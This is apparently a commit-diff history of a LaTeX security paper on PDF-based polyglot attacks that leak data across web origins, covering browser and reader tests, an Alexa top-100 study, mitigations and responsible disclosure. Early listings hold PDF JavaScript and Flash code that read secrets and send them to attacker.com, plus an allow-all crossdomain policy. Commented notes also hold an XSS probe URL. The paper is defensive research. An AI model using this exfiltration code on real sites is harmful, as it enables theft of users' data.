- 'SYSTEM "'+URL+'">]><foo>&x;</foo>';
-var doc = XMLData.parse(xml);
-getURL('attacker.com/?secret='+
-  doc.saveXML())
-endstream
-trailer<</Root
-   <</Pages<<>>
-      /OpenAction
-      <</S/JavaScript/JS 1 0 R>>
-   >>
->>
-\end{lstlisting}
-
-\paragraph{Embedded Flash}
-By embedding a Flash file in the PDF document the capabilities of the format can be 
-extended even further. The Flash runtime supports bidirectional communication in 
-accordance with SOP.
-%
-The embedded Flash inherits the origin of the PDF document, thus it can 
-request and read any document from the originating server. Unlike the XML
-method, there are no restrictions on what content can be requested, thus making 
-it the most versatile of the available communication methods. The only drawback 
-using this approach is the significant increase in terms of file size. Even the compact 
-flash code in Listing~\ref{lst:flash-pdf} will result in a 6 kB Flash file. 
-This suggests that this method might be better suited for the content smuggling 
-scenario in Section~\ref{sec:smuggling}, rather than the syntax injection scenario.
-
-\begin{lstlisting}[label=lst:flash-pdf, caption=Flash code for communication]
-package {
-  import flash.net.*;
-  import flash.display.Sprite;
-  public class Secret extends Sprite {
-    var u:String;
-    var r:URLRequest;
-    var l:URLLoader;
-    public function Secret() {
-      u = 'vulnerable.com/secret';
-      r = new URLRequest(u);
-      l = new URLLoader(r);
-
-      l.addEventListener('complete', 
-        function():void {
-          u = 'attacker.com/?' + r.data;
-          r = new URLRequest(u);
-          l = new URLLoader(r);
-        });
-    }
-  }
-}
-\end{lstlisting}
-
-Cross-origin communication in Flash adheres to the same-origin policy. However, this is not a restriction, since
- Flash also supports cross-origin communication via  
-cross-origin resource sharing. Using CORS, a web server can relax the SOP to allow access to specified content.
-%As mentioned, the embedded Flash file inherits the origin of the document.
-An attacker can set an allow-all cross-origin policy, such as in Listing~\ref{lst:crossdomain}, 
-that open up for two way communication.
-
-\begin{lstlisting}[label=lst:crossdomain, caption=Allow-all crossdomain.xml]
-<?xml version="1.0"?>
-<cross-domain-policy>
-  <allow-access-from domain="*" />
-</cross-domain-policy>
-\end{lstlisting}
-
-%\subsubsection{The attacker}
-%There are a number of ways to communicate with the attacker, either directly 
-%via the embedding page or through the attackers server. As mentioned previously, 
-%many methods trigger page navigation in the browser. This will result in a 
-%noticeable change in the victims browser. While it fulfills the purpose of 
-%leaking information, an attacker can use more covert methods of communication
-%to refrain from alerting the victim.
-
-%\paragraph{Fragment identifier}
-%The methods that navigate the browser can still be used for a somewhat covert 
-%communication with the attacker. Navigating to the same page with a different 
-%fragment identifier will not reload the page. Embedding the information in the fragment 
-%identifier of the URL of the embedding website, creates a one-way communication 
-%channel from the document to the page. Since the fragment identifier is visible 
-%in the address field of the browser, an alert user would notice it changing.
-
-%\paragraph{PostMessage}
-%The PDF plugin includes an API for communicating directly with the page in 
-%which it is embedded. The document can send messages to the page using 
-%the hostContainer.postMessage method. The page registers a handler to receive 
-%the event and is also able to post messages back to the document.
-%This two way communication is not visible to the victim.
-
-%\paragraph{Embedded Flash}
-
-%3 pages 
-\section{Evaluation}
-\label{sec:eval}
-
-This section details the evaluation performed to investigate the persistence of 
-the vulnerabilities from Section~\ref{sec:vuln}. The evaluation covers various 
-instances of affected components, such as browsers and PDF interpreters, 
-content sanitization filter, and a study of the Alexa top 100 websites.
-
-\subsection{Instances}
-
-To better understand how this problem presents itself, a comparison of browser and reader instances 
-is presented. We compare all major browsers and two of the most common readers.
-
-\subsubsection{Readers}
-\label{sec:readers}
-Section~\ref{sec:vuln} focuses on the Adobe PDF Reader as the attack surface, 
-due to its standing as the most commonly used reader. To give a comparison, the 
-Google Chrome built-in PDF reader, was selected as it is the default reader to 
-user of the browser.
-
-As mentioned in Section~\ref{sec:cross}, the browser rely on the reader plug-in to 
-implement correct security measures, in order to prevent cross-domain leakage. 
-Unlike Adobe Reader, the Chrome browser built-in PDF reader refuses to render 
-content that was served with an inappropriate MIME-type if the content is 
-delivered across origins. This effectively prevents the attacks in Section~\ref{sec:vuln}.
-If the Chrome browser is configured to use the Adobe Reader plug-in, it will 
-behave the same as in other browsers and the content will be interpreted as PDF.
-
-\subsubsection{Browsers}
-
-The behavior of cross-domain embedding of PDF resources is studied in the major 
-browsers, i.e., Firefox, Safari, Opera, Google Chrome and Internet Explorer. 
-The study shows that all major browsers are susceptible to the attacks outlined 
-in Section~\ref{sec:vuln}, with some minor differences detailed below and summarized in Table~\ref{tab:comparison}.
-
-\paragraph{Firefox, Safari and Opera}
-The browsers, Firefox, Safari and Opera, are all susceptible to the attacks outlined as 
-per Section~\ref{sec:vuln}, without any restrictions or modifications.
-
-\paragraph{Internet Explorer}
-Microsoft's browser, Internet Explorer, is susceptible to the attacks. However, 
-it seems to only support embedding of PDF documents using the \emph{embed} tag. 
-This is not a major obstacle in exploiting the vulnerability, as the embed and 
-object tags are interchangeable in this respect.
-
-\paragraph{Google Chrome}
-Google's browser, Chrome, has built-in support for displaying PDF documents. 
-The built-in PDF reader is used by default by the browser, unless it has been 
-explicitly disabled by the user. Certain complex PDF documents can not be 
-handled by the built-in reader. The built-in reader will then prompt the user 
-to open the document in Adobe Reader. As previously noted in Section~\ref{sec:readers}, the built-in reader 
-is not vulnerable to attacks. Hence, Chrome is only susceptible when the Adobe 
-Reader plug-in is used to render the document.
-
-\begin{table}[h!]
-\begin{tabular}{l|c|c|c}
-& object & embed & Adobe is default \\ \hline
-Firefox & Yes & Yes & Yes \\ \hline
-Chrome & Yes & Yes & No \\ \hline
-Safari & Yes & Yes & Yes \\ \hline
-Opera & Yes & Yes & Yes \\ \hline
-Internet Explorer & No & Yes & Yes %\\ \hline
-\end{tabular}
-\caption{Comparison of browsers}
-\label{tab:comparison}
-\end{table}
-%\subsection{Bypassing content filters}
-
-%\subsubsection{Server-side upload filters}
-
-%As discussed in Section~\ref{sec:cross} server-side content filters that 
-%validate files based on content type are not equipped to handle polyglot 
-%content. For polyglot content, specialized filters are required that analyze 
-%the content based on all considerable interpretations of the content. No such 
-%filters were encountered in this study.
-
-%\subsubsection{Cross-site scripting filters}
-%\todo{install NoScript?}
-%This effectively bypasses any cross-site scripting filters such as NoScript or
-%filters built into browsers. Since the Reader plug-in handles the response, the
-%browser never gets to see the content
-
-%\subsubsection{Context sensitive filters}
-
-%Context sensitive cross-site scripting filters, that remove or encode characters
-%Clever filters that adapt their filtering to the context in which the user
-%content is included. Basically filters that allow input that do not form harmfulHTML.
-
-% Don't want to claim something I have no basis for..
-
-\subsection{Alexa top 100}
-We have conducted two
-studies to evaluate the prevalence of the problem on popular sites, 
-covering the Alexa top 100 websites. Because of their dominance 
-on the web, these websites are also the most exposed to security threats.
-The first study covers PDF-based polyglot attacks using syntax injection as the 
-infiltration method; the second covers content smuggling.
-%It does not involve polyglot attacks based on content smuggling, as 
-%potential targets generally require authentication before submitting content.
-We refrain from mentioning names of individual websites to prevent exploitation 
-before the issues have been properly dealt with. Neither do we want to disclose 
-these websites as particularly vulnerable. We are in contact with the teams responsible for the websites to help
-mitigate the vulnerabilities.
-
-\paragraph{Syntax injection}
-The study is based on supplying the websites with the benign minimal PDF in 
-Listing~\ref{lst:minimal-pdf}, and examining the corresponding responses to this input.
-The sample contains the essential keywords and tokens required to perform a syntax 
-injection based polyglot attack. If these tokens pass through unaltered, the website is 
-considered vulnerable. Only public accessible input parameters, those that do not require authentication, 
-were tested, which suggests that more websites are likely vulnerable in input that do
-requires authentication.
-
-The conclusion is 
-that nine websites out of the hundred apply insufficient content filtering with 
-respect to the PDF format. Out of the nine found to be vulnerable; three were susceptible to traditional 
-XSS and thereby also to PDF polyglot attacks, two were susceptible only to PDF based polyglot attacks, and four applied 
-insufficient content filtering, but the input was reflected in a way that prevented exploitation, e.g. the header appeared after 1024 bytes.
-%
-%, which have the potential of compromising the 
-%confidentiality and integrity of the website's users.
-%
-
-The two web sites found susceptible only to polyglot attacks and not XSS attacks
-are of particular interest. They both employ proper measures to protect properly 
-against XSS attacks, and yet fall short in defeating this new breed of attacks.
-
-\begin{enumerate}
-\item The first web site reflected user input in an inline  
-JavaScript context, inside a string. To prevent cross-site scripting in this 
-context, the following measures were taken: the JavaScript string delimiters 
-were properly encoded, the backslash character was properly escaped, and the 
-string "$<$/script$>$" was removed. None of these measures prevent an attacker 
-from injecting valid PDF syntax.
-\item The second website reflected the user input in an HTML-comment context. 
-The only measure taken to prevent XSS attacks in this context was removing any 
-occurrence of the character sequence "--$>$". Again, while successfully preventing 
-XSS attacks, this measure is ineffective in preventing an attacker from injecting PDF syntax.
-\end{enumerate}
-
-\paragraph{Content smuggling}
-Further, a smaller study was conducted, not covering the full Alexa top 100, but 
-targeting popular cloud storage services. 
-This study is based on polyglot content being uploaded to the service and 
-subsequently analyzed to determine which origin it was served under. One major 
-enterprise cloud storage service was found to be susceptible to attacks. The service makes an effort to
-follow current best practices, see Section~\ref{sec:smuggling-mitigation}, for almost all uploaded content; the exception being the user's 
-avatar images that are served under the sensitive origin. An attacker could 
-upload a specially crafted avatar image that, when embedded as PDF on the attackers 
-web site, can access and modify the contents of the victim's cloud storage.
-We are currently advising the service provider to help mitigate this vulnerability.
-
-%Baidu.com (allows <>, but escapes /) 
-%LinkedIn (allows <>, but escapes /) 
-%Soso (allows <>, but escapes /) 
-%Youku (vulnerable to traditional XSS) 
-%Soku (vulnerable to traditional XSS) 
-%alibaba.com (allows <>, but escapes /)
-%about.com (vulnerable to traditional XSS,
-%http://linux.about.com/sitesearch.htm?q=XSS&SUName=--%3E%3Cimg+src=x+onerror=alert%281%29%3E)
-%sogou.com (potential target
-%http://www.sogou.com/web?query=%25PDF+%3C%3C+%2F+%3E%3E&_asf=www.sogou.com&_ast=1349689275&w=01019900&p=40040100&sut=11010&sst0=1349689274528)
-
-%1-2 pages 
-\section{Mitigation}
-\label{sec:mit}
-This section gives advice on various mitigation approaches available for each of the
-affected components, both server-side and client-side. It should be noted that 
-preventing polyglot attacks in the general case is a complex task, as one would 
-need to take all potentially malicious formats in to account. Mitigating instances of 
-polyglot attacks based on particular formats are significantly more straightforward.
-
-Note that although some mitigation discussed below is already in place
-(notably as implemented by the Chrome builtin PDF reader), the state of the art
-is far from being satisfactory. As our paper demonstrates, the
-polyglot attacks are a real threat. It is the paper's main value to
-bring attention to polyglot attacks and the importance of
-mitigation against them.
-
-\subsection{Server-side mitigation}
-
-As a content provider on the Internet today there are precautions that one can 
-take to mitigate this class of vulnerabilities. Which precautions to take depend 
-on the kind of services provided. The mitigation recommendations for syntax 
-injection apply to all services that rely on user input, and the content smuggling
-recommendations apply to services that serve user-supplied files.
-
-\subsubsection{Syntax injection}
-
-%In the case of PDF; always encode tokens related to the PDF 
-%syntax. Generally, hard to ensure that tokens for all potential 
-%file formats are properly encoded without breaking anything.
-
-Preventing syntax injection attacks on the server-side poses severe challenges.
-Even server-side filtering of HTML syntax to prevent cross-side scripting
-attacks has proved difficult due to the many contexts in which JavaScript can be 
-introduced. Filtering all potentially harmful tokens from all formats in which a 
-document may be interpreted is hardly possible.
-
-To prevent PDF-based syntax injection attack, the task is simpler. As discussed in Section~\ref{sec:pdf-injection}, the token-set identified in 
-Section~\ref{sec:pdf-injection}, are essential 
-to create valid PDF syntax. %, namely \emph{'$<$', '$>$', and '/'}.
-Filtering 
-user input to remove or encode these characters effectively mitigates the 
-vulnerability. 
-Luckily, because of the significant overlap with the token-set
-of HTML, many of the contexts where user input can occur are already being protected.
-Special attention is required in contexts are not traditionally filtered for 
-HTML tokens, e.g. JSON.
-
-\subsubsection{Content smuggling}
-\label{sec:smuggling-mitigation}
-The current best-practice recommendation from Google~\cite{Google:ContentHosting} 
-on hosting user-supplied content, is to serve the content from a sandboxed origin that is 
-completely separate, as per SOP, and isolated from the sensitive services. 
-These best-practices successfully prevents content smuggling 
-attacks, as the restrictions of the SOP prevents the content from accessing any sensitive 
-resources in the origin of the web service.
-
-These recommendations comes with a caveat that need to be taken into consideration. Some user supplied 
-content is only meant to be accessible to certain authenticated users, e.g. photos that 
-is only shared with friends. In that case, the service needs to transfer the 
-credentials required to authenticate the user from the sensitive origin to the sandboxed 
-origin, without actually revealing the credentials used in the sensitive origin. 
-Revealing the credentials, e.g. using the same cookies on both origins, defeats 
-the purpose of the sandbox origin entirely. Currently there is no uniform solution 
-to this problem. Some common solutions are encountered: using the hashed 
-credentials of the sensitive origin; or generating public, but obscured, links 
-that are later shared manually.
-
-%\todo{Problem of transferring credentials between domains for services where the content requires authentication}
-
-%Google uses the domain name \emph{googleusercontent.com} to sandbox all the 
-%untrusted user files that their various services provide for their customers.
-
-\subsection{Browser}
-
-Traditionally, browser vendors have allowed the browser to override the 
-MIME-type provided by the server for compatibility reasons. This is a compromise 
-to deal with the situation that the server is confused as to what kind of content it is serving. This compromise 
-has repeatedly shown to lead to security issues. The affected browser vendors 
-can help mitigate this problem by limiting the ways content can be coerced to be 
-interpreted as a particular format.
-
-In the case of PDF-based polyglots, the browser can intervene when there is a 
-mismatch between the content-type provided by the server and the type attribute 
-of the \emph{object} tag. The vulnerability can be mitigated by acknowledging that there can be a potential security issue in 
-interpreting the supplied content in the requested format and alerting the user to this
-threat.
-
-One may argue that the browser is as confused as the originating server as to the 
-actual format of the content, and that the issue would be best resolved by the 
-corresponding plug-in.
-
-\subsection{Interpreter}
-
-As a general rule of thumb, the interpreter must at the very least alert the user if the served 
-content-type differs from the expected. A preferred alternative is to 
-not attempt to interpret the content at all. This holds true especially when 
-the served content-type is well known and radically different from that which 
-the interpreter is designed for.
-
-As for the PDF file format, the underlying design decisions have led to the 
-current parsing being very relaxed, even with respect to the specification. 
-Making the parsing more strict and enforcing many of the specified requirements 
-will reduce the attack surface. However, it is not sufficient for complete 
-mitigation. As discussed in Section~\ref{sec:pdf-based-polyglots} the PDF format is a container format; designed to 
-embed syntax from other files. Even when parsing strictly according to 
-the specification, it is a simple task to create a PDF-based polyglot.
-
-%1 page 
-\section{Related work}
-\label{sec:related}
-Backes et al.~\cite{Backes+:SP07} explore the power of the PostScript
-language. PostScript allows executable content and access to sensitive
-information from the environment such as the user id. This work
-demonstrates how to compromise reviewer anonymity in a peer-reviewing
-process by maliciously crafting a PostScript document.
-
-As discussed in Section~\ref{sec:cross}, 
-GIFAR~\cite{Brandis:GIFAR} is based on polyglots that combine the GIF and JAR (Java
-archive) formats. The former is used as benign and the latter as
-malicious to bypass SOP. The Java virtual machine vendors have since
-then mitigated these attacks by patching the virtual machine to be
-more conservative on the format of the executed files.
-
-PDFAR~\cite{PDFAR:09} polyglots combine the PDF and JAR formats, where
-PDF serves as benign and JAR serves as malicious. Such a polyglot is
-possible due to the liberty of the requirements on the headers of PDF
-files. Mitigation against GIFAR attacks in the Java virtual machine
-effectively applies to PDFAR attacks.
-
-Nagra~\cite{Nagra:09} demonstrates GIF/JavaScript polyglots by the
-same file being interpreted as a script and as an image and
-informally discuses possible security implications.
-
-Barth et al.~\cite{Barth+:SP09} focus on security implications of
-content sniffing by browsers. They present content-sniffing XSS
-attacks by crossbreeding HTML with other formats like PostScript. They
-show attacks on real systems like HotCRP, where an uploaded conference
-paper in the PostScript format is interpreted as malicious HTML by the
-browser. They also propose a content-sniffing algorithm that does not
-suffer that helps defending against these class of attacks while
-maintaining compatibility.
-
-Sundareswaran and
-Squicciarini~\cite{Sundareswaran:Squicciarini:CEAS10,Sundareswaran:Squicciarini:SecureComm10} discuss image
-repurposing for GIFAR attacks. They present the AntiGifar tool for
-client-side protection. AntiGifar models the benign behavior of a user
-by a control-flow graph and detects possible anomalies when the
-interactions of the user and browser with the web site deviate from
-the control-flow model.
-
-As mentioned in Section~\ref{sec:cross}, Huang et
-al.~\cite{Huang+:CCS10} study an HTML/CSS attack. This attack injects
-fragments of CSS syntax in a HTML document, thereby making it a
-HTML/CSS polyglot. The error-tolerant parsing of style sheets allow
-the polyglot to parsed as valid CSS. The capabilities of CSS provide
-trivial cross-origin leakage. As discussed earlier, the paper's
-defense technique has been adopted by all major browsers, which
-implies that the attacks outlined in their paper are now ineffective.
-
-Wolf's OMG WTF PDF presentation~\cite{Wolf:CCC10} is one of the 
-inspirations for our work. The presentation explores the liberty
-of the PDF format. In addition, it highlights that PDF interpreters
-often disregard the specification demands. This is particularly
-relevant as it allows crossbreeding PDF with such
-formats as ZIP and EXE.
-
-Heiderich et al.~\cite{Heiderich+:CCS11} explore the Scalable Vector
-Graphics (SVG) format. They discover attacks that allow SVG files,
-embedded via the \emph{img} tag, to run arbitrary JavaScript. 
-One of the
-attack vectors involves an SVG/HTML polyglot
-that behaves differently depending on the context in which it is
-accessed. When included in the \emph{img} tag, the file is interpreted as SVG,
-whereas when it is accessed directly it is interpreted as malicious HTML.
-
-%1 page 
-\section{Conclusions}
-\label{sec:conc}
-We have put a spotlight on a new breed of attacks that smuggle
-malicious payload formatted as benign content. We have identified
-polyglots as the root cause for this class of attacks. In a systematic
-study, we have characterized the necessary ingredients for
-polyglot-based attacks on the web and arrive at the PDF format to be
-particularly dangerous. Our empirical studies in the web setting
-confirm vulnerabilities in the current content filters both in the
-server side and in browsers, as well as in the PDF interpreters.
-These vulnerabilities open up for insecure communication across
-Internet origins and allow attacking web sites from the top 100 Alexa
-list. To mitigate the attacks, we suggest general measures against
-polyglot-based attacks.  These measures are a combination of
-protection on the server side, in browsers, and in content
-interpreters such as PDF readers.
-
-The affected vendors have been made aware of the
-vulnerabilities. These vendors include Adobe (notified instantly after
-discovering the security implications of polyglot PDFs)
-%in late 2009
-and the major browser vendors. We have also contacted the vulnerable
-web sites from the top 100 Alexa list.
-%
-Following responsible disclosure, we refrain from providing the names of the vulnerable web sites.
-
-Future work includes identification of further formats vulnerable to
-polyglot-based attacks. Versatile media content formats such as the
-Windows Media Video format are of particular concern because of their
-potential for executing scripts. Further investigation of the PDF
-format might lead to enhanced possibilities to bypass content filters
-by alternative character sets.
-
-We also plan to extend the empirical study to popular services like
-HotCRP, Europass CV, and arXiv.org that allow uploading PDF
-documents. Authorization is pending for an in-depth security study of
-a major conference management system.
-
-%1-2 pages 
-\bibliographystyle{plain}
-\bibliography{literature}
 \end{document}

### 2013-05-08 main.tex
Fixed \ref{\todo{}}

@@
 \subsection{Attack vectors}
-
+\label{sec:vectors}
 %In the scenario the attacker infiltrate the origin by uploading a polyglot. Infiltration could, however, be performed in more %than one way.
@@
 
-As explained in Section~\ref{\todo{ref}} there are two vectors for polyglot 
+As explained in Section~\ref{sec:vectors} there are two vectors for polyglot 
 attacks; \emph{syntax injection} and \emph{content smuggling}. PDF is a suitable 
@@
 in Section~\ref{sec:vuln}, with some minor differences detailed below and summarized in Table~\ref{tab:comparison}.
+In Table~\ref{tab:comparison}, "Yes" for the columns "object" and "embed" indicates that the 
+corresponding tag can be used to embed a PDF document, and for the column 
+"Adobe is default" it indicates that Adobe Reader is the commonly default PDF reader.
 

### 2013-05-08 main.tex
check point

@@
 practice in client/server content filtering and PDF readers for polyglot-based
-attacks, and report on vulnerabilities in the top 100 Alexa web sites. Our
+attacks, and report on vulnerabilities in the top 100 Alexa web
+sites. 
+%
+We identify five web sites to be vulnerable to syntax injection
+attacks. Further,
+%
+we have found two major 
+enterprise cloud storage services to be susceptible to content
+smuggling attacks.
+%
+Our
 recommendations for protective measures on server side, in browsers, and in content
@@
 
-\paragraph{Attack vectors}
 \todo{Describe general scenario with forward pointer}
@@
 practice in client/server content filtering and PDF readers for polyglot-based
-attacks, and report on vulnerabilities in the top 100 Alexa web sites. Our
+attacks, and report on vulnerabilities in the top 100 Alexa web
+sites. 
+%
+Unfortunately, several major web sites do not protect against polyglot
+attacks. Five out of the top 100 Alexa web sites are vulnerable to syntax injection
+attacks. In addition,
+we have found two major 
+enterprise cloud storage services to be susceptible to content
+smuggling attacks.
+%
+Our
 recommendations for protective measures on server side, in browsers, and in content
@@
 
-In recent versions of Adobe Reader certain measures has been taken to prevent 
-creating PDF-based polyglots. In accordance with our recommendations Adobe Reader 
+In recent versions of Adobe Reader certain measures have been taken to prevent 
+creating PDF-based polyglots. In accordance with our recommendations, Adobe Reader 
 has made the parsing more strict by attempting to match the first bytes of the 
 file against a set of known signatures. If 
-a match is found, the parser will abort loading of the document. The problem of 
+a match is found, the parser will abort loading of the document. 
+However, this does not fully defend against PDF-based polyglot attacks.
+The problem of 
 this approach is that there are a number of file formats that lack a reliable 
@@
 must match the signature enforced by other interpreters of the format. A notable 
-counter example is the signature used for the JPG format. While the signature is 
+counterexample is the signature used for the JPG format. While the signature is 
 correct according to the specification of the format, several JPG interpreters
@@
 studies to evaluate the prevalence of the problem on popular sites, 
-covering the Alexa top 100 websites. Because of their dominance 
-on the web, these websites are also the most exposed to security threats.
+covering the Alexa top 100 web sites. Because of their dominance 
+on the web, these web sites are also the most exposed to security threats.
 The first study covers PDF-based polyglot attacks using syntax injection as the 
@@
 %potential targets generally require authentication before submitting content.
-We refrain from mentioning names of individual websites to prevent exploitation 
-before the issues have been properly dealt with. Neither do we want to disclose 
-these websites as particularly vulnerable. We are in contact with the teams responsible for the websites to help
+We refrain from mentioning names of individual web sites to prevent exploitation 
+before the issues have been properly dealt with. Neither do we disclose 
+these web sites as particularly vulnerable. We are in contact with the teams responsible for the web sites to help
 mitigate the vulnerabilities.
@@
 \paragraph{Syntax injection}
-The study is based on supplying the websites with the benign minimal PDF in 
+The study is based on supplying the web sites with the benign minimal PDF in 
 Listing~\ref{lst:minimal-pdf}, and examining the corresponding responses to this input.
 The sample contains the essential keywords and tokens required to perform a syntax 
-injection based polyglot attack. If these tokens pass through unaltered, the website is 
+injection based polyglot attack. If these tokens pass through unaltered, the web site is 
 considered vulnerable. The process has been conducted manually and only input 
@@
 were tested. Considering that most inputs are available only to authenticated 
-users, the results suggests that more websites are likely vulnerable in input that do
+users, the results suggests that more web sites are likely vulnerable in input that do
 require authentication.
@@
 The conclusion is 
-that nine websites out of the hundred apply insufficient content filtering with 
+that nine web sites out of the hundred apply insufficient content filtering with 
 respect to the PDF format. Out of the nine found to be vulnerable; five were 
@@
 %, which have the potential of compromising the 
-%confidentiality and integrity of the website's users.
+%confidentiality and integrity of the web site's users.
 %
@@
 from injecting valid PDF syntax.
-\item The second website reflected the user input in an HTML-comment context. 
+\item The second web site reflected the user input in an HTML-comment context. 
 The only measure taken to prevent XSS attacks in this context was removing any 
@@
 This study is based on polyglot content being uploaded to the service and 
-subsequently analyzed to determine which origin it was served under. Two major 
-enterprise cloud storage services were found to be susceptible to attacks. Both service makes an effort to
+subsequently analyzed to determine which origin it was served
+under. We have found two major 
+enterprise cloud storage services to be susceptible to attacks. Both service makes an effort to
 follow current best practices, see Section~\ref{sec:smuggling-mitigation}, but fail to cover scenarios for content upload.

### 2013-05-09 main.tex
Major update, fixing most todos

@@
 server from which it originates. 
-\todo{More?} Typically a document is considered to be an HTML-page.
+%
+%Typically a document is considered to be an HTML-page.
 
@@
 multiple interpretation of the content, providing a new space of attack vectors.
-
-\todo{Describe general scenario with forward pointer}
-We present novel attack vectors that are based on (i)
+An attacker can use a polyglot to infiltrate a vulnerable origin.
+Once infiltrated, the polyglot is embedded in the attackers web site using a plug-in.
+According to the SOP, content loaded in a plug-in is considered to belong to the 
+origin from which it was loaded, thus allowing the polyglot to communicate with the vulnerable 
+origin. A victim visiting the attacker's web site, while authenticated in the vulnerable
+origin, will activate the malicious polyglot, which can abuse the credentials of the victim 
+in its communication with the vulnerable service. The scenario is explained in detail in Section~\ref{sec:vectors},
+where we present novel attack vectors that are based on (i)
 \emph{syntax injection} that 
@@
 Unfortunately, several major web sites do not protect against polyglot
-attacks. Five out of the top 100 Alexa web sites are vulnerable to syntax injection
+attacks. Five out of the top 100 Alexa web sites are vulnerable to syntax injec
 attacks. In addition,
@@
 to cross origins by circumventing the same-origin policy. We begin by 
-generalizing the problem of crossing formats to \emph{polyglots} and then describe the  
+describing cross-origin information leaks, next we
+generalize the problem of crossing formats to \emph{polyglots} and describe the  
 characteristics of a malicious polyglot. From that we derive two attack vectors and 
@@
 
-Other examples of problematic elements include the \emph{object} and
+Another example of problematic elements include the \emph{object} and
 \emph{embed} tags. These 
@@
 because the server delivering the content might not be able to determine its
-format, the tags allow a developer to set the type-attribute to guide the
+format, the tags allow a developer to set the type attribute to guide the
 browser in which plug-in to run. When the type attribute is used, the
@@
 %
-
 As with images, the content handled by the plug-in is executed in the origin it was served from. 
@@
 The browsers are forced to rely on the plug-ins to employ correct security 
-measures. Section~\ref{sec:eval} shows that even state-of-the-art plug-ins fail to properly do so. As we will show, this can lead to 
-to cross-origin information leaks.
+measures. Section~\ref{sec:eval} shows that even state-of-the-art plug-ins fail to 
+properly do so, emphasizing the importance of increasing awareness on the issue. 
+%Next we show how crossing formats
+%to cross-origin information leaks.
 
@@
 
-Barth et al.~\cite{Barth+:SP09} define \emph{chameleon} documents, 
-in which a benign file type crossbred with malicious HTML content. The document 
-is crafted in such a way that the content-sniffing algorithm used in the browser 
+Barth et al.~\cite{Barth+:SP09} define \emph{chameleon} documents 
+as a benign file type crossbred with malicious HTML content. The attack 
+targets the content-sniffing algorithm used in the browser and the document 
+is crafted in such a way that the browser 
 will detect the content type as HTML. The paper proceeds to 
@@
 \emph{chameleon} document, that is valid PostScript, but will be identified as HTML.
-This issue allows exploitation when there is a mismatch between a websites 
+This issue allows exploitation when there is a mismatch between a web site's 
 content validation filter and the browsers content-sniffing algorithm.
@@
 attacks, based on one of the early instances of attacks based on 
-GIF/JAR polyglots. 
+GIF images that are also valid JAR files. 
 Sundareswaran et al.~\cite{Sundareswaran:Squicciarini:CEAS10,Sundareswaran:Squicciarini:SecureComm10}
@@
 %In the scenario the attacker infiltrate the origin by uploading a polyglot. Infiltration could, however, be performed in more %than one way.
+
+The general pattern of a polyglot attack is described in the following scenario, illustrated in Figure~\ref{fig:scenario}. 
+The target of the attack is the web site \emph{vulnerable.com}. It has been 
+infiltrated by an attacker to serve a malicious polyglot within its sensitive origin (1).
+The content is served by \emph{vulnerable.com} as the benign format, e.g., an image, harmless 
+to users of the web site.
+The victim in this scenario is an authenticated user of \emph{vulnerable.com}.
+At some point, while still authenticated to \emph{vulnerable.com}, 
+the unsuspecting victim visits the attackers web site \emph{attacker.com} (2).
+Upon visiting \emph{attacker.com}, the web site uses a plug-in to embed the 
+polyglot from \emph{vulnerable.com} as the malicious format (3). This is achieved by 
+setting the type attribute to the MIME-type of the corresponding plug-in, which 
+will override the MIME-type supplied by \emph{vulnerable.com}. When loaded in 
+the plug-in the malicious polyglot is executed in the \emph{vulnerable.com} origin (4), 
+as described in Section~\ref{sec:cross-origin}. The impact depends on the 
+payload and the capabilities of the malicious format.
+
 This paper identifies two vectors for infiltrating an origin, either via syntax 
@@
 to become a polyglot, whereas with content smuggling, a polyglot is used to evade 
-content filters.
+content filters. The vectors are described below with more detailed scenarios.
+
+\begin{figure}[t]
+  \center
+  \includegraphics[width=0.49\textwidth]{scenario.png}
+  \caption{Overview of the scenario}
+  \label{fig:scenario}
+\end{figure}
 
@@
 script code. Similarly, in a syntax injection attack the vulnerable target will 
-compose content from attacker controlled input containing syntax of a foreign 
-format, thereby creating a polyglot. The polyglot is benign when viewed as the 
-original format, but malicious when viewed as the injected format. While the 
-targeted service serves the content as its original format, it is in the hands 
-of the attacker to decide how it is interpreted. Examples of 
-such services include social networks, search engines, i.e., nearly any dynamic user driven website.
+compose an HTML document from attacker controlled input containing syntax of a foreign 
+format. The resulting document is a polyglot which is benign when viewed as the 
+HTML, but malicious when viewed as the injected format. While the 
+web site serves the content as HTML, it is in the hands 
+of the attacker to decide how it is interpreted when embedded in the attackers web page. Examples of 
+such services include social networks, search engines, i.e., nearly any dynamic web site driven by user interaction.
 %
 The targeted service is assumed to employ server-side cross-site scripting 
-sanitization. Hence, for the attack to be successful, the input must 
+sanitization. For the attack to be successful, the input must 
 bypass this sanitization. The sanitization filter will remove or encode 
-problematic characters related to HTML-syntax, based on the context of the web application. In a polyglot attack
-the injected format will pose as a new context, unknown to the filter. Chances are that the 
-key elements of the injected format will pass the filter unaltered.
+problematic characters in the input related to HTML-syntax. The injected format will 
+pose as a new context, unknown to the filter. Chances are that the 
+injected format will pass the filter unnoticed.
 
@@
 the attack proceeds from the infiltration of the origin to the compromise of the victim.
-The victim in this scenario is an authenticated user of the targeted website, \emph{vulnerable.com}. 
-The \emph{vulnerable.com} site serves the polyglot content as the benign content type, harmless to the victim. 
-At a certain point, while still authenticated to \emph{vulnerable.com}, 
-the victim unsuspectingly visits the attackers malicious website, \emph{attacker.com} (1).
-The \emph{attacker.com} site serves a page that embeds the content from \emph{vulnerable.com} (2). 
-The attacker supplies polyglot syntax in the input to the vulnerable 
-service, e.g. in the parameters of the request for the embedded content (3).
-The \emph{vulnerable.com} service responds with content of the benign content type (4), but
-the way it is embedded in the attackers page coerces the browser to interpret it as the malicious content type.
+Again, the victim is an authenticated user of \emph{vulnerable.com} that 
+unsuspectingly visits the attackers malicious web site, \emph{attacker.com} (1). 
+The \emph{attacker.com} web site uses a plug-in to embed a web page with 
+vulnerable input parameters from \emph{vulnerable.com} (2). 
+In the parameters of the request the attacker injects the syntax of the malicious format (3).
+The response from \emph{vulnerable.com} is a polyglot served as the benign content type (4), but
+the attacker's page coerces the content to be interpreted as the malicious content type by the plug-in.
 The malicious payload is executed in the origin of \emph{vulnerable.com} and can 
-hence leverage the credentials of the victim to further exploit the vulnerability.
+leverage the credentials of the victim to further exploit the vulnerability.
 
@@
   \includegraphics[width=0.49\textwidth]{injection-scenario.png}
-  \caption{Overview of the syntax injection scenario}
+  \caption{Syntax injection scenario}
   \label{fig:injection-scenario}
@@
 The vulnerable target of a content smuggling attack, lets 
-users submit files to the service which are subsequently served under the origin of 
+users upload files that are subsequently served under the origin of 
 the service. Examples of such potentially vulnerable services are cloud storage services, image databases, 
 social networks, conference management systems or job broker services. Such a service 
-accepts a limited set of file-formats, and the files are run through a filter to verify that they 
